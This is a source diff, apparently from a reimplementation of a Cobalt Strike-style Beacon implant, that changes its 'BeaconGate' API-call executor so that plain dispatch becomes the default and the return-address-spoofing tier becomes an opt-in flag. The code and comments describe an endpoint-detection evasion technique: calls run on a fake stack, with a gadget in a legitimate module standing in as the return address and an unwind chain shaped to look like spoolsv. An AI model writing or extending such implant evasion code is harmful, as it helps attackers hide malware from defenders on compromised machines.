@@ -3,16 +3,18 @@
  * Official contract (4.10 blog, FUNCTION_CALL): when BeaconGate is enabled
  * for a supported API, Beacon packs the call into a FUNCTION_CALL
  * {functionPtr, function enum, numOfArgs, args[], bMask, retValue} and
- * hands it to the gate executor (official default = plain Railgun-style
- * dispatch). Our executor has two tiers:
+ * hands it to the gate executor. Our executor has two tiers:
  *
- *   1. spoofed (default when available): the call executes on a private
- *      fake stack whose unwind chain is the proven spoolsv shape (gen3
- *      frame table) - RtlVirtualUnwind from the callee sees only
- *      legitimate module frames. A jmp [rbp-8] gadget in a legit module
- *      serves as the callee's return address (return-address spoofing) and
- *      hops back to the recovery stub with RAX intact.
- *   2. plain: generic N-arg dispatch (official default parity).
+ *   1. plain (default): generic N-arg dispatch.
+ *   2. spoofed (opt-in, GATE_MODE_SPOOF): the call executes on a private
+ *      fake stack; an `add rsp, imm8; ret` gadget in a legit module is the
+ *      callee's return address and hops back to the recovery stub with RAX
+ *      intact.
+ *
+ * The spoof tier is NOT default. Its fake unwind chain does not line up
+ * with the gadget's real frame (a walker would not see the spoolsv shape),
+ * it is incompatible with CET shadow stacks, and its fake-stack page is a
+ * process-wide singleton. It stays one flag away for research use.
  *
  * Any init failure (no gadget, gen3 frames unavailable, x86) degrades to
  * plain dispatch - the gate never breaks the call.
@@ -29,10 +31,7 @@
 
 /* settings 96 = per-API bitmask; 97 = mode flags */
 #define GATE_MODE_ALL             (1 << 0)
-/* GATE_MODE_SPOOF (bit1) no longer gates the executor: the "first-call
- * fault" that forced the opt-in was the exec probe's own broken stack
- * restore (missing add rsp,28h before the pops), not the hop. Kept as a
- * reserved bit for future tier selection. */
+/* GATE_MODE_SPOOF (bit1): opt-in switch for the spoofed executor. */
 #define GATE_MODE_SPOOF           (1 << 1)
 
 /* offsets mirror gate_spoof.asm exactly */
@@ -245,11 +244,9 @@ unsigned long long gate_dispatch(FUNCTION_CALL * fc)
 	GATE_SPOOFCTX ctx;
 	int i;
 
-	/* C-58 v2: the spoof executor is DEFAULT once the machine yields a
-	 * gadget (init failure degrades to plain = official default). The
-	 * probe-epilogue fault that forced the opt-in downgrade was the
-	 * probe's own broken stack restore, not the hop. */
-	if (g_gate_spoof_ready == 0)
+	/* the spoofed executor is opt-in (setting 97 bit 1); init failure
+	 * degrades to plain dispatch */
+	if (g_gate_spoof_ready == 0 && (setting_int(SETTING_BEACON_GATE_MODE) & GATE_MODE_SPOOF))
 		gate_init_spoof();
 
 	if (g_gate_spoof_ready == 1) {
